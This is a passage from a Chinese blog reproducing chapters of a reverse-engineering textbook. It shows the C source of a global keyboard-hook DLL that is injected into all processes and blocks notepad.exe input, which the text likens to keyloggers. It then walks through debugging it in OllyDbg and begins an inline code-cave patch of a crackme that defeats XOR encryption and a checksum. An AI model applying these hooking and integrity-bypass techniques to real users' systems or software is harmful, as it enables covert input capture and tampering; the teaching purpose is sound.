时，调用HookStop()函数终止钩取。重要代码处添加了注释，认真查看就能轻松理解，不会遇到什么困难。</p><p><strong>KeyHook.dll.cpp</strong><br>接下来继续看KeyHook.dll文件的源代码（KeyHook.dll.cpp ）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;windows.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DEF_PROCESS_NAME<span class="hljs-string">&quot;notepad.exe&quot;</span></span><br><br>HINSTANCE g_hInstance = <span class="hljs-literal">NULL</span>;<br>HHOOK g_hHook = <span class="hljs-literal">NULL</span>;<br>HWND g_hWnd = <span class="hljs-literal">NULL</span>;<br><br>BOOL WINAPI <span class="hljs-title function_">DllMain</span><span class="hljs-params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span><br>&#123;<br><span class="hljs-keyword">switch</span>( dwReason )<br>&#123;<br>        <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>g_hInstance = hinstDLL;<br><span class="hljs-keyword">break</span>;<br><br>        <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br><span class="hljs-keyword">break</span>;<br>&#125;<br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><br>LRESULT CALLBACK <span class="hljs-title function_">KeyboardProc</span><span class="hljs-params">(<span class="hljs-type">int</span> nCode, WPARAM wParam, LPARAM lParam)</span><br>&#123;<br><span class="hljs-type">char</span> szPath[MAX_PATH] = &#123;<span class="hljs-number">0</span>,&#125;;<br><span class="hljs-type">char</span> *p = <span class="hljs-literal">NULL</span>;<br><br><span class="hljs-keyword">if</span>( nCode &gt;= <span class="hljs-number">0</span> )<br>&#123;<br><span class="hljs-comment">// bit 31 : 0 =&gt; press, 1 =&gt; release</span><br><span class="hljs-keyword">if</span>( !(lParam &amp; <span class="hljs-number">0x80000000</span>) ) <span class="hljs-comment">// 释放键盘按键时</span><br>&#123;<br>GetModuleFileNameA(<span class="hljs-literal">NULL</span>, szPath, MAX_PATH);<br>p = <span class="hljs-built_in">strrchr</span>(szPath, <span class="hljs-string">&#x27;\\&#x27;</span>);<br><br>            <span class="hljs-comment">//比较当前进程名称，若为notepad.exe，則消息不会传递给应用程序(或下一个&quot;钩子”)</span><br><span class="hljs-keyword">if</span>( !_stricmp(p + <span class="hljs-number">1</span>, DEF_PROCESS_NAME) )<br><span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><br>    <span class="hljs-comment">//若非notepad.exe，则调用CallNextHookEx()函数，将消息传递给应用程序（或下一个”钩子”）。</span><br><span class="hljs-keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>__declspec(dllexport) <span class="hljs-type">void</span> <span class="hljs-title function_">HookStart</span><span class="hljs-params">()</span><br>&#123;<br>g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="hljs-number">0</span>);<br>&#125;<br><br>    __declspec(dllexport) <span class="hljs-type">void</span> <span class="hljs-title function_">HookStop</span><span class="hljs-params">()</span><br>    &#123;<br>        <span class="hljs-keyword">if</span>( g_hHook )<br>        &#123;<br>            UnhookWindowsHookEx(g_hHook);<br>            g_hHook = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br>&#125;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br></code></pre></td></tr></table></figure><p>DLL代码也非常简单。调用导出函数HookStart()时，SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链。</p><blockquote><p>MSDN中对KeyboardProc函数的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">LRESULT CALLBACK <span class="hljs-title function_">KeyboardProc</span><span class="hljs-params">(</span><br><span class="hljs-params"><span class="hljs-type">int</span> code,</span><br><span class="hljs-params"> <span class="hljs-comment">// hook code</span></span><br><span class="hljs-params">WPARAM wParam,</span><br><span class="hljs-params"> <span class="hljs-comment">// virtual-key code</span></span><br><span class="hljs-params">LPARAM lParam</span><br><span class="hljs-params"> <span class="hljs-comment">// keystroke-message information</span></span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>上面3个参数中，wParam指用户按下的键盘按键的虚拟键值（virtual key code）。对键盘这一硬件而言，英文字母“A”与“a”具有完全相同的虚拟键值。参数IParam根据不同的位具有多种不同的含义（repeat count、scan code、extended-key flag、context code、previous key - state flag、transition-state flag ）。使用 ToAscii() API 函数可以获得实际按下的键盘的ASCII值。</p></blockquote><p>安装好键盘“钩子”后，无论哪个进程，只要发生键盘输入事件，OS就会强制将KeyHook.dll注入相应进程。加载了 KeyHook.dll的进程中，发生键盘事件时会首先调用执行KeyHook.KeyboardProc()。</p><p>函数中发生键盘输入事件时，就会比较当前进程的名称与“notepad.exe”字符串，若相同，则返回1,终止KeyboardProc()函数，这意味着截获且删除消息。这样，键盘消息就不会传递到notepad.exe程序的消息队列。 </p><blockquote><p>因notepad.exe未能接收到任何键盘消息，故无法输出。</p></blockquote><p>除此之外（即当前进程名称非 “notepad.exe” 时），执行return CallNextHookEx(g_hHook,nCode,wParam，lParam);语句，消息会被传递到另一个应用程序或钩链的另一个“钩子”函数。</p><blockquote><p>监视或记录用户键盘输入的程序被称为“键盘记录器”（Key Logger）。有些键盘记录器本身是PC恶意代码，通过钩取键盘消息，在PC用户不知情的情况下盗走用户的键盘输入，其工作原理与KeyHook.dll的工作原理基本一致。</p></blockquote><h1 id="21-5-调试练习"><a href="#21-5-调试练习" class="headerlink" title="21.5 调试练习"></a>21.5 调试练习</h1><p>本节将学习有关Windows消息钩取调试的技术。</p><h2 id="21-5-1-调试-HookMain-exe"><a href="#21-5-1-调试-HookMain-exe" class="headerlink" title="21.5.1 调试 HookMain.exe"></a>21.5.1 调试 HookMain.exe</h2><p>先调试用来安装键盘钩子的HookMain.exe。请使用OllyDbg打开HookMain.exe文件，如图21-8所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96.assets/image-20220220204521284.png" alt="图21-8 HookMain.exe的EP代码"></p><p>图21-8显示的是HookMain.exe的EP代码，它是典型的VC++启动函数，其中最受关注的是开始进行键盘钩取的部分。</p><p>查找核心代码</p><p>有几种方法可以帮助我们找到关注的核心代码：</p><p> □逐行跟踪。</p><p> □检索相关API。</p><p> □检索相关字符串。</p><p>第一种方法是程序无法正常运行或难以预测时使用的下策，此处略去不谈。这样就剩下后面2种方法（检索API或字符串）了。</p><p>由于已经运行过HookMain.exe程序，我们知道了该程序的功能（键盘钩取）与输岀的字符串，所以下面要使用检索字符串（图21-3的”press ‘q’ to quit!”）的方法。引用该字符串代码的前后就是我们关注的代码。在OllyDbg的代码窗口中，选择鼠标右键菜单中的Search for - All referenced text strings项。</p><p>弹出字符串窗口，如图21-10所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96.assets/image-20220220204750303.png" alt="图21-10 Text strings referenced in HookMain"></p><p>从图21-10中可以看到，40104D地址处的指令引用了要査找的字符串。双击字符串，转到相应地址处（40104D）。 </p><p>图21-11中显示的代码其实就是HookMain.exe程序的main()函数（借助OllyDbg的字符串检索功能即可轻松找到）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96.assets/image-20220220205225254.png" alt="图21-11 main()函数"></p><p><strong>调试main()函数</strong></p><p>在401000地址处设置断点，然后运行程序，到断点处停下来，开始调试。从断点开始依次跟踪调试代码，可以了解main()中的主要代码流。先在401006地址处调用LoadLibrary(KeyHook.dll)，然后由40104B地址处的CALL EBX命令调用KeyHook.dll.HookStart()函数。跟踪40104B地址处的CALL EBX命令（StepInto（F7））,出现图21-12所示的代码。</p><blockquote><p>DLL加载的地址本该是0x1000000，这里是被别的DLL占用了位置所以重定位到了0x290000</p><p>下面Notepad被加载时定位到了0x640000和0x940000，可以看偏移来确定函数地址，偏移是不会变得。</p></blockquote><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96.assets/image-20220220205450544.png" alt="图21-12 KeyHook.HookStart()函数"></p><p>图21-12中的代码是被加载到HookMain.exe进程中的KeyHook.dll的HookStart()函数（请确认一下图中的地址区域）。在2910DF地址处可以看到CALL SetWindowsHookExW()指令，其上方2910D8与2910DD地址处的2条PUSH指令用于把SetWindowsHookExW() API的第1、2两个参数压入栈。</p><p>SetWindowsHookExW()API的第一个参数（idHook ）值为WH_KEYBOARD（2），第二个参数（lpfn）值为291020，该值即是钩子过程的地址。后面调试KeyHook.dll时再仔细看该地址。HookMain.exe的main()函数（ 401000 ）的其余代码接收到用户输入的“q”命令后终止钩取。以上内容非常简单，希望各位亲自调试。</p><h2 id="21-5-2-调试-Notepad-exe-进程内的-KeyHook-dll"><a href="#21-5-2-调试-Notepad-exe-进程内的-KeyHook-dll" class="headerlink" title="21.5.2 调试 Notepad.exe 进程内的 KeyHook.dll"></a>21.5.2 调试 Notepad.exe 进程内的 KeyHook.dll</h2><p>本小节将调试KeyHook.dll中的钩子过程，此时KeyHook.dll已被注入notepad.exe进程。首先使用OllyDbg打开Notepad.exe程序（也可以使用Attach命令打开运行中的notepad.exe进程）。通过OllyDbg中的“运行”（F9）命令使notepad.exe进程正常运行。</p><p>如图21-14所示，在OllyDbg的Debugging options（中文为选项菜单-&gt;调试设置）中，点选Break on new module（DLL）复选框。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96.assets/image-20220220214740860.png" alt="图21 -14 更改OllyDbg选项：Break on new module(DLL)"></p><p>开启该选项后，每当新的DLL装人被调试（Debuggee ）进程时就会自动暂停调试（这在“从DLL注入时开始调试”的情况下非常有用）。此时运行HookMain.exe （参考图21-3）。然后在notepad.exe中使用键盘输入，此时OllyDbg暂停调试，并弹出Executable modules窗口。</p><p>如图21-15所示，KeyHook.dll被加载到640000地址处。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96.assets/image-20220221111433711.png" alt="图21-15 Executable modules窗口"></p><blockquote><p>根据系统环境不同，有时不会先显示KeyHook.dll，而是先加载其他DLL库。此时按（F9）运行键，直到KeyHook.dll加栽完成。有些系统无法正常运行该功能，此时使用OllyDbg 2.0即可保证运行顺畅。</p></blockquote><p>如图21-15所示，双击KeyHook.dll转到KeyHook.dll的EP地址处。由于我们已经知道钩子过程的地址为291020,下面直接转到该地址处（请先在OllyDbg中取消对Break on new module（DLL）项的选择，使其处于“未选中”状态）。</p><p>如图21-16所示，向“钩子”过程（641020）设置断点，每当notepad.exe中发生键盘输入事件时，调试就停在该处。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC21%E7%AB%A0%20Windows%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96.assets/image-20220221125347998.png" alt="调到这里闪退了，重开后Base变成了0x940000"></p><p>在栈中可以看到KeyboardProc()函数的参数。最后，将以上操作过程按顺序整理如下： </p><p>□用OllyDbg 运行 notepad.exe （或者 Attach 运行中的 notepad.exe ）;</p><p>□开启 Break on new module（DLL）选项； </p><p>□运行 KeyLogger.exe— 安装 global keyboard message hook； </p><p>□在notepad中使用键盘输入―发生键盘消息事件（按键a输入）；</p><p>□ KeyLogger.dll 被注入 notepad.exe 进程； </p><p>□在OllyDbg中向KeyboardProc （钩子进程）设置断点。</p><p>关于KeyboardProc()函数（偏移为0x1020）可以参考前面源代码说明中的相关内容，请各位自己调试。</p><h1 id="21-6小结"><a href="#21-6小结" class="headerlink" title="21.6小结"></a>21.6小结</h1><p>本章讲解了Windows消息钩取技术与DLL钩子过程调试方法。这些知识在代码逆向分析中起着非常重要的作用，希望各位认真学习并掌握。特别是要反复练习“从DLL的EP代码开始调试”的方法，直到完全掌握。</p><p>Q.回调函数（CALLBACK）是什么？ </p><p>A.简言之，就是某个特定事件发生时被指定调用的函数。窗口Windows过程（WndProc）就是一个典型的回调函数（键盘、鼠标等事件发生时OS会调用注册的窗口过程）。</p><p>Q.我是超级菜鸟，几乎什么都不懂，应该从哪儿开始学啊？从C语言开始吗？ </p><p>A.其实，只有具备一定的Win32编程知识，才能较好地理解示例中的代码（当然也要有一定的C语言知识）。初次接触代码逆向分析时会遇到大量术语，这些术语往往让人一头雾水、不知所措，“这些都是学习代码逆向分析技术的绊脚石”，我（直到几年）之前一直这样想。但是看到那些没有以上知识却依然能够将代码#逆向分析做得很棒的人，我的想法慢慢改变了。</p><p>我认识的代码逆向分析人员中，有几个人学习逆向分析技术时根本就不怎么懂C语言，他们学习时每当遇到C语言代码就直接敲一下，不断查找询问，后面就慢慢弄懂了。学习过 程中遇到不懂的术语就记下来（初次看到会觉得难，但见过10次以后就不会这样想了）。遇难而退不可取，反而应该谦虚谨慎、不骄不躁地去吸收更多新知识。他们现在都成为代码逆向分析技术的专家了呢。 </p><p>Q. declspec函数是什么？ </p><p>A. declspec是针对编译器的关键字，指出相应函数为导出函数。</p><p>Q. SetWindowsHookEx()API为什么在KeyHook.dll内部调用？您说它是安装钩子的API? </p><p>A.是的。SetWindowsHookEx() API用于将指定的“钩子”过程注册到钩链中。无论在DLL内部还是外部均可调用（编程时怎么方便怎么来）。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第21章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第20章 “内嵌补丁”练习</title>
    <link href="/1999/02/18/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0/"/>
    <url>/1999/02/18/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>第20章“内嵌补丁”练习<br>对加密文件、运行时解压缩文件“打补丁”时，经常使用“内嵌补丁”（InlinePatch）技术,本章将通过示例让读者了解、学习。 </p><h1 id="20-1内嵌补丁"><a href="#20-1内嵌补丁" class="headerlink" title="20.1内嵌补丁"></a>20.1内嵌补丁</h1><p>“内嵌补丁”是“内嵌代码补丁”（Inline Code Patch）的简称，难以直接修改指定代码时，插入并运行被称为“洞穴代码”（CodeCave）的补丁代码后，对程序打补丁。常用于对象程序经过运行时压缩（或加密处理）而难以直接修改的情况。详细说明参见图20-1。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215155904699.png" alt="图20-1"></p><p>图20-1左图描述的是典型的运行时压缩代码（或者加密代码）。EP代码先将加密的OEP代码解密，然后再跳转到OEP代码处。若要打补丁的代码存在于经过加密的OEP区域是很难打补丁的（即使知道代码所在位置也是如此），因为解码过程中可能会解出完全不同的结果。</p><p>解决上述问题的简单方法就是如图20-1中右图所示，在文件中另外设置被称为“洞穴代码” 的“补丁代码”，EP代码解密后修改JMP指令，运行洞穴代码。在洞穴代码中执行补丁代码后（由于已经解密OEP，故可以这样修改），再跳转到OEP处。也就是说，每次运行时（运行另外的补丁代码）都要对进程内存的代码打补丁，所以这种打补丁的方法被称为“内嵌代码补丁”法或“内嵌补丁”法。这也是它与一般修改代码方法的不同。表20-1中列出了普通代码补丁与内嵌补丁的不同之处。</p><h1 id="20-2-练习：-Patchme"><a href="#20-2-练习：-Patchme" class="headerlink" title="20.2 练习： Patchme"></a>20.2 练习： Patchme</h1><p>一名叫ap0x的代码逆向分析者制作了一个patchme程序，它是完全公开的，用来帮助大家学<br>习代码逆向分析技术。本小节使用这个简单的示例，向各位充分展现“内嵌补丁”这一方法。</p><blockquote><p><a href="http://ap0x.jezgra.net/download/patchme_nol.rar">http://ap0x.jezgra.net/download/patchme_nol.rar</a><br>（出处：ap0x - Reversing Labs网页）</p></blockquote><p>这是一个非常简单的小程序，总共5KB。先检查它是否含有病毒代码再运行。</p><p>运行程序，弹岀如图20-2所示的消息框，要求更改显示的字符串。单击“确定”按钮，弹出图20-3所示的对话框。</p><p>对话框中有一个字符串要求解压其本身（unpackme ）。这个patchme程序比较简单，只要修改上面2处字符串即可。但问题是程序文件中2个字符串都处在加密状态，难以修改。</p><h1 id="20-3-调试：查看代码流"><a href="#20-3-调试：查看代码流" class="headerlink" title="20.3 调试：查看代码流"></a>20.3 调试：查看代码流</h1><p>首先使用OllyDbg打开程序文件，如图20-4所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215191646627.png" alt="图20-4"></p><p>EP代码非常简单。地址401007之后即是加密代码。为了查找图20-2与图20-3中出现的消息，选择鼠标右键菜单中的Search for All referenced text strings，如图20-5所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215191736496.png" alt="图20-5"></p><p>如预料的一样，所有字符串都处在加密状态，这种情形下无法查找到指定字符串。在图20-4中跟踪进入401001地址处CALL命令调用的函数（4010E9），执行一段时间后遇到图20-6所示的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215192104816.png" alt="图20-6"></p><p>这段代码就是解密循环。地址4010A3处的XOR BYTE PTR DS:[EBX],44语句使用XOR命令对<br>特定区域（4010F5~401248）解密。跟踪进入地址4010B0处CALL命令调用的函数（4010BD）,<br>可以看到另外2个解密循环，如图20-7所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215192618917.png" alt="图20-7"></p><p>地址4010C8处的XOR命令用来解密401007~401085区域，然后再使用4010DB地址处的XOR<br>命令对4010F5~401248区域解密。特别是该区域与图20-6中解密区域一致，由此可知该区域经过<br>双重加密处理。4010BD函数调用完毕后遇到4010B6地址处的CALL 401039命令，如图20-6所示。<br>跟踪进入被调用的函数（401039 ），看到图20-8所示的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215192845114.png" alt="图20-8"></p><p>401039函数中需要注意的是位于401046地址处的校验和计算循环。首先使用401041地址处的<br>MOV EDX,0命令，将0代入（初始化）EDX。然后使用401046地址处的ADD命令，从特定地址区<br>域（4010F5~401248 ）以4个字节为单位依次读入值，进行加法运算后，将累加结果存储到EDX<br>寄存器。</p><p>循环结束时，EDX寄存器中存储着某个特定值，这就是校验和值。由前面的讲解可知，该校验和计算区域是一个双重加密区域。可以推测岀，我们要修改的字符串就存在于此。</p><blockquote><p>EDX寄存器为4个字节大小，像这样向其中不断加上4个字节的值，就会发生溢出（overflow）问题。一般的校验和计算中常常忽略该溢出问题，使用最后一个保存在EDX的值。</p></blockquote><p>位于地址401062~401068处的CMP&#x2F;JE命令用来将计算得到的校验和（存储在EDX寄存器的）值与31EB8DB0比较，若相同（表示代码未被改动过），则由401083地址处的JMP指令跳转到OEP（40120.）处;若不同，则输岀错误信息“CrC of this file has been modified!!!”，终止程序。</p><p>这种校验和计算方法常常用来验证特定区域的代码&#x2F;数据是否被改动过。只要指定区域中的一个字节发生改变，校验和值就会改变。所以更改了指定区域中的代码&#x2F;数据时，一定要修改校验和比较相关部分。 图20-9中显示的是OEP代码，用来运行对话框。执行位于40123E地址处的CALL user32.DialogBoxParamA()命令后，即弹岀对话框。下面是DialogBoxParamA() API的定义。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215195139380.png" alt="20-9"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">INTPTR WINAPI <span class="hljs-title function_">DialogBoxParam</span><span class="hljs-params">(</span><br><span class="hljs-params">__in_optHINSTANCE hlnstance,</span><br><span class="hljs-params">__inLPCTSTR IpTemplateName,</span><br><span class="hljs-params">__in_optHWND hWndParent,</span><br><span class="hljs-params">__in_optDLGPROC IpDialogFunc,</span><br><span class="hljs-params">__in LPARAMdwInitParam</span><br><span class="hljs-params">)</span>;<br></code></pre></td></tr></table></figure><p>DialogBoxParamA() API的第四个参数lpDialogFunc用来指出Dialog Box Procedure的地址（在OllyDbg中显示为DlgProc）。图20-9的40122C地址处有条PUSH 4010F5命令，由此可见，函数第四个参数DlgProc的地址为4010F5。图20-10是DlgProc（4010F5）的代码，顶端粗线框部分是我们要修改的字符串（下面的方框中会使用这些字符串）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215200837988.png" alt="图20-10"></p><p>通过以上简单的调试，我们大致把握了程序的流向，以及要修改的字符串所在的位置（40110A，401123 ）（像这样，在没有源代码的条件下调试二进制文件，就像迷路时寻路或猜谜一<br>样，让入觉得非常有趣）。</p><p>该程序的各部分都做了加密处理，特别是要修改的字符串被加密过两次。并且在程序内部针对字符串区域计算校验和值，借以检验字符串是否发生更改，这些都大大增加了修改字符串的难度。对于这样的程序，使用常规的文件修改方法难以奏效，但使用“内嵌补丁”方法能够轻松地“打补丁”。</p><blockquote><p>像示例这种加密程序其实是相当简单的，综合考虑XOR加密与校验和代码后，可以直接修改。但为了学习“内嵌补丁”这一技术，我们不会使用该方法，而是按照常见做法添加“洞穴代码”修改。</p></blockquote><h1 id="20-4-代码结构"><a href="#20-4-代码结构" class="headerlink" title="20.4 代码结构"></a>20.4 代码结构</h1><p>为了方便说明，首先看一下示例代码的组织结构。若把握了代码结构，就能很容易地找岀如<br>何对哪些代码打补丁。 </p><p>图20-11的[A]、[B]、[C]区域为加密后的代码，[EPCode]、[Decoding Code]区域存在着用于解密的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215201023137.png" alt="图20-11"></p><p>大致的代码流如下所示。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-number">401000</span>[EP Code]<br><span class="hljs-number">40109</span>B[Decoding Code]<br><span class="hljs-number">4010</span><span class="hljs-built_in">A3</span><span class="hljs-keyword">XOR </span>[<span class="hljs-keyword">B] </span>with <span class="hljs-number">44</span><br><span class="hljs-number">4010</span>C8<span class="hljs-keyword">XOR </span>[A] with <span class="hljs-number">7</span> <br><span class="hljs-number">4010</span>DB<span class="hljs-keyword">XOR </span>[<span class="hljs-keyword">B] </span>with <span class="hljs-number">11</span><br><span class="hljs-number">401039</span>[A]<br><span class="hljs-number">401046</span>Checksum [<span class="hljs-keyword">B]</span><br><span class="hljs-keyword"></span><span class="hljs-number">401090</span><span class="hljs-keyword">XOR </span>[C] with <span class="hljs-number">17</span><br><span class="hljs-number">401083</span><span class="hljs-keyword">JMP </span>OEP<br></code></pre></td></tr></table></figure><p>[EP Code]只是用来调用[Decoding Code]的，实际的解密处理是由[Decoding Code]完成的。按 照[B]-[A]-[B]的顺序解码（XOR），运行解密后的[A]区代码。在[A]区代码中会求得[B]区的校验和，并据此判断[B]区代码是否发生过更改。然后对[C]区解码（XOR ），最后跳到OEP处（ 40121E ）。</p><blockquote><p>建议各位根据代码结构与代码流亲自调试确认。“打补丁”之前掌握代码结构会使操作更加容易，且初学者在这一个过程中也会感受到许多乐趣。如果想进一步享受调试，建议各位调试时不要参考“代码结构”与“代码流”内容。自己动手挑战，成功的话将拥有无尽喜悦。</p></blockquote><h1 id="20-5-“内嵌补丁”练习"><a href="#20-5-“内嵌补丁”练习" class="headerlink" title="20.5 “内嵌补丁”练习"></a>20.5 “内嵌补丁”练习</h1><p>实际要打补丁的字符串全部位于[B]区，如前所见，[B]区是特别经过双重加密处理的，并且要通过求校验和来判断是否发生更改，所以直接修改字符串会有些困难。此时，一种更易使用的方法就是利用补丁代码的“内嵌补丁”法（这类补丁代码称为“洞穴代码”）。</p><p>简单说一下操作顺序。</p><p>首先向文件合适位置插入用于修改字符串的代码，然后在图20-11的[A]区域将JMP OEP命令修改为JMP补丁代码（当然修改时要充分考虑文件中的[A]区域处于加密状态）。若运行程序时遇到[A]区中的JMP补丁代码语句，（此时所有代码均处于解密状态且通过校验和验证，所以）就在补丁代码中更改字符串，通过JMP命令跳转到OEP处，这样整个内嵌补丁过程就完成了。 </p><h2 id="20-5-1补丁代码要设置在何处呢"><a href="#20-5-1补丁代码要设置在何处呢" class="headerlink" title="20.5.1补丁代码要设置在何处呢"></a>20.5.1补丁代码要设置在何处呢</h2><p>这个问题在进行内嵌补丁的过程中非常重要。有如下3种设置方法： </p><p>①设置到文件的空白区域。 </p><p>②扩展最后节区后设置。 